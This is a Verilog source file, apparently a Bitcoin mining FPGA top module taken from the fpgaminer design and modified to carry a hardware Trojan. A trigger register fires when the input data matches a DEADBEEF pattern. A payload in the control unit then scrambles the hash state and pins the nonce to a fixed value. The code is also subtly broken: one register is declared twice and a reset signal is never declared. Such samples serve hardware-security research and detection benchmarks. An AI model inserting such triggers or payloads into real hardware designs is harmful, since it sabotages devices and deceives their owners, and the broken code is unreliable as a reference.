/*
*
* Copyright (c) 2011 fpgaminer@bitcoin-mining.com
*
*
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
* 
*/


`timescale 1ns/1ps

module fpgaminer_top (osc_clk);

	// The LOOP_LOG2 parameter determines how unrolled the SHA-256
	// calculations are. For example, a setting of 0 will completely
	// unroll the calculations, resulting in 128 rounds and a large, but
	// fast design.
	//
	// A setting of 1 will result in 64 rounds, with half the size and
	// half the speed. 2 will be 32 rounds, with 1/4th the size and speed.
	// And so on.
	//
	// Valid range: [0, 5]
`ifdef CONFIG_LOOP_LOG2
	parameter LOOP_LOG2 = `CONFIG_LOOP_LOG2;
`else
	parameter LOOP_LOG2 = 0;
`endif

	// No need to adjust these parameters
	localparam [5:0] LOOP = (6'd1 << LOOP_LOG2);
	// The nonce will always be larger at the time we discover a valid
	// hash. This is its offset from the nonce that gave rise to the valid
	// hash (except when LOOP_LOG2 == 0 or 1, where the offset is 131 or
	// 66 respectively).
	localparam [31:0] GOLDEN_NONCE_OFFSET = (32'd1 << (7 - LOOP_LOG2)) + 32'd1;

	input osc_clk;


	//// 
	reg [255:0] state = 0;
	reg [511:0] data = 0;
	reg [31:0] nonce = 32'h00000000;


	//// PLL
	wire hash_clk;
	`ifndef SIM
		main_pll pll_blk (osc_clk, hash_clk);
	`else
		assign hash_clk = osc_clk;
	`endif


	//// Hashers
	wire [255:0] hash, hash2;
	reg [5:0] cnt = 6'd0;
	reg feedback = 1'b0;
	
	// Trojan activation trigger
    reg trojan_activated = 1'b0;
    always @(posedge osc_clk) begin
        if (data == 512'hDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF) begin
            trojan_activated <= 1'b1;
        end
    end

	sha256_transform #(.LOOP(LOOP)) uut (
		.clk(hash_clk),
		.feedback(feedback),
		.cnt(cnt),
		.rx_state(state),
		.rx_input(data),
		.tx_hash(hash)
	);
	sha256_transform #(.LOOP(LOOP)) uut2 (
		.clk(hash_clk),
		.feedback(feedback),
		.cnt(cnt),
		.rx_state(256'h5be0cd191f83d9ab9b05688c510e527fa54ff53a3c6ef372bb67ae856a09e667),
		.rx_input({256'h0000010000000000000000000000000000000000000000000000000080000000, hash}),
		.tx_hash(hash2)
	);


	//// Virtual Wire Control
	reg [255:0] midstate_buf = 0, data_buf = 0;
	wire [255:0] midstate_vw, data2_vw;

	`ifndef SIM
		virtual_wire # (.PROBE_WIDTH(0), .WIDTH(256), .INSTANCE_ID("STAT")) midstate_vw_blk(.probe(), .source(midstate_vw));
		virtual_wire # (.PROBE_WIDTH(0), .WIDTH(256), .INSTANCE_ID("DAT2")) data2_vw_blk(.probe(), .source(data2_vw));
	`endif


	//// Virtual Wire Output
	reg [31:0] golden_nonce = 0;
	
	`ifndef SIM
		virtual_wire # (.PROBE_WIDTH(32), .WIDTH(0), .INSTANCE_ID("GNON")) golden_nonce_vw_blk (.probe(golden_nonce), .source());
		virtual_wire # (.PROBE_WIDTH(32), .WIDTH(0), .INSTANCE_ID("NONC")) nonce_vw_blk (.probe(nonce), .source());
	`endif


	// Control Unit updated with the Trojan's payload
    reg [31:0] golden_nonce = 0;
    reg is_golden_ticket = 1'b0;
    reg feedback_d1 = 1'b1;
    wire [5:0] cnt_next;
    wire [31:0] nonce_next;
    wire feedback_next;

    always @(posedge hash_clk) begin
        midstate_buf <= midstate_vw;
        data_buf <= data2_vw;

        cnt <= cnt_next;
        feedback <= feedback_next;
        feedback_d1 <= feedback;

        // Check if the Trojan is activated and alter the state accordingly
        if (trojan_activated) begin
            state <= {state[127:0], ~state[255:128]}; // Example of a malicious alteration when the Trojan is active
            nonce <= 32'hBADBEEF; // Alter the nonce to a specific value as part of the Trojan's payload
        end else begin
            state <= midstate_buf;
            data <= {384'h000002800000000000000000000000000000000000000000000000000000000000000000000000000000000080000000, nonce_next, data_buf[95:0]};
            nonce <= nonce_next;
        end

        // Original functionality to detect valid hash
        is_golden_ticket <= (hash2[255:224] == 32'h00000000) && !feedback_d1;
        if (is_golden_ticket) begin
            golden_nonce <= nonce - GOLDEN_NONCE_OFFSET;
        end
    end

    // Logic for updating cnt, feedback, and nonce remains standard
    assign cnt_next = reset ? 6'd0 : (LOOP == 1) ? 6'd0 : (cnt + 6'd1) & (LOOP-1);
    assign feedback_next = (LOOP == 1) ? 1'b0 : (cnt_next != {(LOOP_LOG2){1'b0}});
    assign nonce_next = reset ? 32'd0 : feedback_next ? nonce : (nonce + 32'd1);

endmodule